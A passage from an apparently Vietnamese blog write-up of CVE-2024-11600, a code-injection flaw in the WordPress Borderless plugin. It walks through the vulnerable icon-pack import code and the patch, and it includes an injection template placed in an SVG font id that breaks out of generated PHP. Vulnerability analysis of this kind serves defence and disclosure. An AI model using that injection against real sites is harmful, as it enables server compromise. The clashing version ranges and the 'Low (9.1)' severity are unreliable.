0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The Borderless – Widgets, Elements, Templates and Toolkit for Elementor &amp;amp; Gutenberg&lt;/strong&gt; của WordPress tồn tại lỗ hổng &lt;strong&gt;Remote Code Execution&lt;/strong&gt; trong tất cả các phiên bản cho đến và bao gồm &lt;strong&gt;1.5.9&lt;/strong&gt; thông qua hàm &lt;strong&gt;write_config&lt;/strong&gt;. Nguyên nhân là do thiếu &lt;strong&gt;sanitization&lt;/strong&gt; trên file &lt;strong&gt;JSON&lt;/strong&gt; được import. Điều này cho phép kẻ tấn công đã xác thực, với quyền &lt;strong&gt;Administrator-level access&lt;/strong&gt; trở lên, thực thi mã trên server.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-11600&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-11600&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/borderless/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Borderless Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Borderless&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v1.6.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function write_config() {&#xA;    $charmap = $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] . &amp;#39;/&amp;#39; . $this-&amp;gt;paths[&amp;#39;config&amp;#39;];&#xA;    $handle  = @fopen( $charmap, &amp;#39;w&amp;#39; );&#xA;    if ( $handle ) {&#xA;        fwrite( $handle, &amp;#39;&amp;lt;?php $icons = array();&amp;#39; );&#xA;        &#xA;        // Safely build the PHP array with sanitized content&#xA;        foreach ( $this-&amp;gt;json_config[ $this-&amp;gt;ip_name ] as $icon =&amp;gt; $info ) {&#xA;            if ( ! empty( $info ) ) {&#xA;                $delimiter   = &amp;#34;&amp;#39;&amp;#34;;&#xA;                $safe_icon   = esc_attr( $icon );&#xA;                $safe_class  = esc_attr( $info[&amp;#34;class&amp;#34;] );&#xA;                $safe_tags   = esc_attr( $info[&amp;#34;tags&amp;#34;] );&#xA;&#xA;                fwrite( $handle, &amp;#34;\r\n&amp;#34; . &amp;#39;$icons[\&amp;#39;&amp;#39; . $this-&amp;gt;ip_name . &amp;#39;\&amp;#39;][&amp;#39; . $delimiter . $safe_icon . $delimiter . &amp;#39;] = array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39; . $delimiter . $safe_class . $delimiter . &amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39; . $delimiter . $safe_tags . $delimiter . &amp;#39;);&amp;#39; );&#xA;            } else {&#xA;                $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;                die( esc_html__( &amp;#39;Error generating the configuration file.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;            }&#xA;        }&#xA;        fclose( $handle );&#xA;    } else {&#xA;        $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;        die( esc_html__( &amp;#39;Error generating the configuration file.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;write_config()&lt;/code&gt; ghi cấu hình icon vào file PHP. Mỗi icon được ghi dưới dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$icons[&amp;#39;&amp;lt;ip_name&amp;gt;&amp;#39;][&amp;#39;&amp;lt;icon_name&amp;gt;&amp;#39;] = array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39;&amp;lt;class&amp;gt;&amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39;&amp;lt;tags&amp;gt;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trước khi ghi ra file, biến này được lấy từ thuộc tính &lt;code&gt;id&lt;/code&gt; của thẻ &lt;code&gt;&amp;lt;font&amp;gt;&lt;/code&gt; trong SVG và đi qua bộ lọc:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;ip_name = (string) $font_attr[&amp;#39;id&amp;#39;];&#xA;$this-&amp;gt;ip_name = sanitize_text_field( $this-&amp;gt;ip_name );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; chỉ loại bỏ thẻ HTML, ký tự điều khiển và khoảng trắng thừa. Nó không ngăn chặn các ký tự đặc biệt nguy hiểm trong ngữ cảnh PHP code (ví dụ &lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;]&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Do đó, attacker có thể chèn payload trong thuộc tính &lt;code&gt;id&lt;/code&gt; của SVG.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;font id=&amp;#34;&amp;#39;]; php_code;//&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi đó, dòng ghi vào file sẽ trở thành:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$icons[&amp;#39;&amp;#39;]; php_code;//&amp;#39;][&amp;#39;&amp;lt;icon_name&amp;gt;&amp;#39;] = array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39;&amp;lt;class&amp;gt;&amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39;&amp;lt;tags&amp;gt;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Bản vá (v1.6.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;ip_name = sanitize_file_name( $this-&amp;gt;ip_name );&#xA;if ( empty( $this-&amp;gt;ip_name ) ) {&#xA;    $this-&amp;gt;ip_name = &amp;#39;unknown&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã sử dụng &lt;code&gt;sanitize_file_name()&lt;/code&gt; thay cho &lt;code&gt;sanitize_text_field()&lt;/code&gt; giúp loại bỏ toàn bộ ký tự đặc biệt nguy hiểm (&lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;&amp;quot;&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt;, &lt;code&gt;|&lt;/code&gt;, &lt;code&gt;..&lt;/code&gt;, khoảng trắng, Unicode phức tạp…) và chuẩn hóa chuỗi thành tên file/key an toàn. Điều này ngăn chặn việc chèn payload phá vỡ cú pháp PHP trong file cấu hình.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/diff.png&#39; alt=&#34;Diff&#34; height=&#34;146&#34; width=&#34;1864&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký submenu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function borderless_icon_fonts_submenu() {&#xA;    $icon_manager_page = add_submenu_page(&#xA;        &amp;#39;borderless.php&amp;#39;,&#xA;        esc_html__( &amp;#34;Icon Fonts&amp;#34;, &amp;#34;borderless&amp;#34; ),&#xA;        esc_html__( &amp;#34;Icon Fonts&amp;#34;, &amp;#34;borderless&amp;#34; ),&#xA;        &amp;#39;manage_options&amp;#39;,&#xA;        &amp;#39;borderless-fonts&amp;#39;,&#xA;        &amp;#39;borderless_custom_icons_menu&amp;#39;&#xA;    );&#xA;    $Borderless_IF  = new Borderless_IF;&#xA;    add_action(&amp;#39;admin_print_styles-&amp;#39; . $icon_manager_page, array( $Borderless_IF, &amp;#39;admin_scripts&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;Icon Fonts&#39;&lt;/code&gt;: Title của submenu&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;manage_options&#39;&lt;/code&gt;: Menu này chỉ dành cho Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;borderless-fonts&#39;&lt;/code&gt;: Menu slug&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tương ứng trên Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/dashboard.png&#34; title=&#34;Menu trên Admin Dashboard&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/dashboard.png&#34; data-sub-html=&#34;&lt;h2&gt;Dashboard&lt;/h2&gt;&lt;p&gt;Menu trên Admin Dashboard&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/dashboard.png&#39; alt=&#34;Dashboard&#34; height=&#34;523&#34; width=&#34;1864&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Menu trên Admin Dashboard&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;borderless_custom_icons_menu&#39;&lt;/code&gt;: Callback được gọi khi truy cập menu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function borderless_custom_icons_menu() {&#xA;    $Borderless_IF = new Borderless_IF;&#xA;    $Borderless_IF-&amp;gt;icon_pack_manager();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tại đây, đối tượng &lt;code&gt;Borderless_IF&lt;/code&gt; được tạo:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Borderless_IF {&#xA;    function __construct() {&#xA;        $this-&amp;gt;paths            = wp_upload_dir();&#xA;        $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;]   = &amp;#39;borderless_icon_fonts&amp;#39;;&#xA;        $this-&amp;gt;paths[&amp;#39;temp&amp;#39;]    = trailingslashit( $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;] ) . &amp;#39;borderless_temp&amp;#39;;&#xA;        $this-&amp;gt;paths[&amp;#39;fontdir&amp;#39;] = trailingslashit( $this-&amp;gt;paths[&amp;#39;basedir&amp;#39;] ) . $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;];&#xA;        $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] = trailingslashit( $this-&amp;gt;paths[&amp;#39;basedir&amp;#39;] ) . $this-&amp;gt;paths[&amp;#39;temp&amp;#39;];&#xA;        $this-&amp;gt;paths[&amp;#39;fonturl&amp;#39;] = set_url_scheme( trailingslashit( $this-&amp;gt;paths[&amp;#39;baseurl&amp;#39;] ) . $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;] );&#xA;        $this-&amp;gt;paths[&amp;#39;tempurl&amp;#39;] = trailingslashit( $this-&amp;gt;paths[&amp;#39;baseurl&amp;#39;] ) . trailingslashit( $this-&amp;gt;paths[&amp;#39;temp&amp;#39;] );&#xA;        $this-&amp;gt;paths[&amp;#39;config&amp;#39;]  = &amp;#39;charmap.php&amp;#39;;&#xA;&#xA;        add_action( &amp;#39;wp_ajax_borderless_ajax_add_zipped_font&amp;#39;, array( $this, &amp;#39;add_zipped_font&amp;#39; ) );&#xA;        add_action( &amp;#39;wp_ajax_borderless_ajax_remove_zipped_font&amp;#39;, array( $this, &amp;#39;remove_zipped_font&amp;#39; ) );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Construct khởi tạo các đường dẫn và hook cần thiết. Hàm &lt;code&gt;write_config&lt;/code&gt; sử dụng chúng để tạo đường dẫn ghi cấu hình:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$charmap = $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] . &amp;#39;/&amp;#39; . $this-&amp;gt;paths[&amp;#39;config&amp;#39;];&#xA;&#xA;// &amp;lt;base_url&amp;gt;/wp-content/uploads/borderless_icon_fonts/borderless_temp/charmap.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;AJAX action &lt;code&gt;wp_ajax_borderless_ajax_add_zipped_font&lt;/code&gt; được đăng ký để xử lý việc upload và thêm font từ file zip, với callback &lt;code&gt;add_zipped_font&lt;/code&gt; được gọi để thực hiện quá trình giải nén và ghi dữ liệu vào file cấu hình.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function add_zipped_font() {&#xA;    $cap = apply_filters( &amp;#39;avf_file_upload_capability&amp;#39;, &amp;#39;update_plugins&amp;#39; );&#xA;    if ( ! current_user_can( $cap ) ) {&#xA;        die( esc_html__( &amp;#34;You do not have sufficient permissions to use this feature.&amp;#34;, &amp;#34;borderless&amp;#34; ) );&#xA;    }&#xA;    // Retrieve the file path of the zip file&#xA;    $attachment = $_POST[&amp;#39;values&amp;#39;];&#xA;    $path       = realpath( get_attached_file( sanitize_text_field( $attachment[&amp;#39;id&amp;#39;] ) ) );&#xA;    $unzipped   = $this-&amp;gt;zip_flatten( $path, array( &amp;#39;\.eot&amp;#39;, &amp;#39;\.svg&amp;#39;, &amp;#39;\.ttf&amp;#39;, &amp;#39;\.woff&amp;#39;, &amp;#39;\.json&amp;#39;, &amp;#39;\.css&amp;#39; ) );&#xA;    &#xA;    // If we managed to unzip the file and save it, extract the SVG file&#xA;    if ( $unzipped ) {&#xA;        $this-&amp;gt;create_config();&#xA;    }&#xA;    &#xA;    // If we did not get a name for the font, do not add it and remove the temp folder&#xA;    if ( $this-&amp;gt;ip_name == &amp;#39;unknown&amp;#39; ) {&#xA;        $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;        die( esc_html__( &amp;#39;Unable to retrieve the Icon Pack name from your uploaded folder.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;    }&#xA;    die( esc_html__( &amp;#39;borderless_font_added:&amp;#39;, &amp;#39;borderless&amp;#39; ) . $this-&amp;gt;ip_name );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong hàm &lt;code&gt;add_zipped_font()&lt;/code&gt;, sau khi người dùng upload một file zip chứa Icon Pack, plugin thực hiện các bước:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Kiểm tra quyền &lt;code&gt;update_plugins&lt;/code&gt; =&amp;gt; chỉ dành cho Administrator.&lt;/li&gt;&#xA;&lt;li&gt;Unzip và chỉ giữ lại các file cần thiết cho Icon Pack: font (&lt;code&gt;.eot&lt;/code&gt;, &lt;code&gt;.svg&lt;/code&gt;, &lt;code&gt;.ttf&lt;/code&gt;, &lt;code&gt;.woff&lt;/code&gt;), &lt;code&gt;JSON&lt;/code&gt;, &lt;code&gt;CSS&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Gọi đến &lt;code&gt;create_config()&lt;/code&gt; để tạo config file:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;function create_config() {&#xA;    $this-&amp;gt;json_file = $this-&amp;gt;find_json();&#xA;    $this-&amp;gt;svg_file  = $this-&amp;gt;find_svg();&#xA;    if ( empty( $this-&amp;gt;json_file ) || empty( $this-&amp;gt;svg_file ) ) {&#xA;        $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;        die( esc_html__( &amp;#39;SVG file or selection.json not found. Please check the integrity of the Icon Pack files.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;    }&#xA;&#xA;    // Attempt to read the SVG file&#xA;    $response = wp_remote_fopen( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempurl&amp;#39;] ) . $this-&amp;gt;svg_file );&#xA;    $json     = file_get_contents( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] ) . $this-&amp;gt;json_file );&#xA;&#xA;    if ( empty( $response ) ) {&#xA;        $response = file_get_contents( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] ) . $this-&amp;gt;svg_file );&#xA;    }&#xA;&#xA;    if ( ! is_wp_error( $json ) &amp;amp;&amp;amp; ! empty( $json ) ) {&#xA;        // Load and parse the SVG&#xA;        $xml       = simplexml_load_string( $response );&#xA;        $font_attr = $xml-&amp;gt;defs-&amp;gt;font-&amp;gt;attributes();&#xA;        $glyphs    = $xml-&amp;gt;defs-&amp;gt;font-&amp;gt;children();&#xA;&#xA;        // Sanitize the font name (ip_name)&#xA;        $this-&amp;gt;ip_name = (string) $font_attr[&amp;#39;id&amp;#39;];&#xA;        $this-&amp;gt;ip_name = sanitize_text_field( $this-&amp;gt;ip_name );&#xA;&#xA;        $font_folder = trailingslashit( $this-&amp;gt;paths[&amp;#39;fontdir&amp;#39;] ) . $this-&amp;gt;ip_name;&#xA;        if ( is_dir( $font_folder ) ) {&#xA;            $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;            die( esc_html__( &amp;#34;There is already an Icon Pack with this name. Please upload with another name.&amp;#34;, &amp;#34;borderless&amp;#34; ) );&#xA;        }&#xA;&#xA;        // Decode JSON content&#xA;        $file_contents = json_decode( $json );&#xA;        if ( ! isset( $file_contents-&amp;gt;IcoMoonType ) ) {&#xA;            $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;            die( esc_html__( &amp;#34;This Icon Pack is not an Icomoon pack. Use only Icomoon Icon Pack files.&amp;#34;, &amp;#39;borderless&amp;#39; ) );&#xA;        }&#xA;        &#xA;        // Iterate over icons to build $this-&amp;gt;json_config&#xA;        $icons = $file_contents-&amp;gt;icons;&#xA;        foreach ( $icons as $icon ) {&#xA;            // Sanitize each piece of data to prevent injection&#xA;            $raw_name   = isset( $icon-&amp;gt;properties-&amp;gt;name ) ? $icon-&amp;gt;properties-&amp;gt;name : &amp;#39;unknown&amp;#39;;&#xA;            $icon_name  = sanitize_text_field( $raw_name );&#xA;            &#xA;            // Create a &amp;#34;class&amp;#34; by removing spaces and sanitizing further&#xA;            $icon_class = str_replace( &amp;#39; &amp;#39;, &amp;#39;&amp;#39;, $icon_name );&#xA;            // Remove any other characters that are not typical in a CSS class&#xA;            $icon_class = preg_replace( &amp;#39;/[^A-Za-z0-9\-_]/&amp;#39;, &amp;#39;&amp;#39;, $icon_class );&#xA;            &#xA;            $raw_tags   = isset( $icon-&amp;gt;icon-&amp;gt;tags ) ? $icon-&amp;gt;icon-&amp;gt;tags : array();&#xA;            // Sanitize each tag&#xA;            $safe_tags  = array_map( &amp;#39;sanitize_text_field&amp;#39;, $raw_tags );&#xA;            $tags       = implode( &amp;#34;,&amp;#34;, $safe_tags );&#xA;            &#xA;            $this-&amp;gt;json_config[ $this-&amp;gt;ip_name ][ $icon_name ] = array(&#xA;                &amp;#34;class&amp;#34; =&amp;gt; $icon_class,&#xA;                &amp;#34;tags&amp;#34;  =&amp;gt; $tags&#xA;            );&#xA;        }&#xA;&#xA;        if ( ! empty( $this-&amp;gt;json_config ) &amp;amp;&amp;amp; $this-&amp;gt;ip_name != &amp;#39;unknown&amp;#39; ) {&#xA;            $this-&amp;gt;write_config();&#xA;            $this-&amp;gt;re_write_css();&#xA;            $this-&amp;gt;rename_files();&#xA;            $this-&amp;gt;rename_folder();&#xA;            $this-&amp;gt;add_font();&#xA;        }&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này là &lt;strong&gt;trái tim&lt;/strong&gt; của quá trình thêm Icon Pack. Nó chịu trách nhiệm đọc dữ liệu từ file SVG và JSON, sau đó sinh ra cấu hình icon để plugin sử dụng.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Kiểm tra file cần thiết&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;json_file = $this-&amp;gt;find_json();&#xA;$this-&amp;gt;svg_file  = $this-&amp;gt;find_svg();&#xA;if ( empty( $this-&amp;gt;json_file ) || empty( $this-&amp;gt;svg_file ) ) {&#xA;    $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;    die( esc_html__( &amp;#39;SVG file or selection.json not found...&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Plugin tìm file &lt;code&gt;.json&lt;/code&gt; và file font &lt;code&gt;.svg&lt;/code&gt; trong thư mục tạm.&lt;/li&gt;&#xA;&lt;li&gt;Nếu thiếu một trong hai, quá trình bị hủy.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Đọc nội dung SVG và JSON&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = wp_remote_fopen( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempurl&amp;#39;] ) . $this-&amp;gt;svg_file );&#xA;$json     = file_get_contents( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] ) . $this-&amp;gt;json_file );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Dùng &lt;code&gt;wp_remote_fopen&lt;/code&gt; để đọc SVG qua URL, fallback sang &lt;code&gt;file_get_contents&lt;/code&gt; nếu thất bại.&lt;/li&gt;&#xA;&lt;li&gt;Đọc JSON trực tiếp từ thư mục tạm.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Parse SVG để lấy tên font&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$xml       = simplexml_load_string( $response );&#xA;$font_attr = $xml-&amp;gt;defs-&amp;gt;font-&amp;gt;attributes();&#xA;$this-&amp;gt;ip_name = (string) 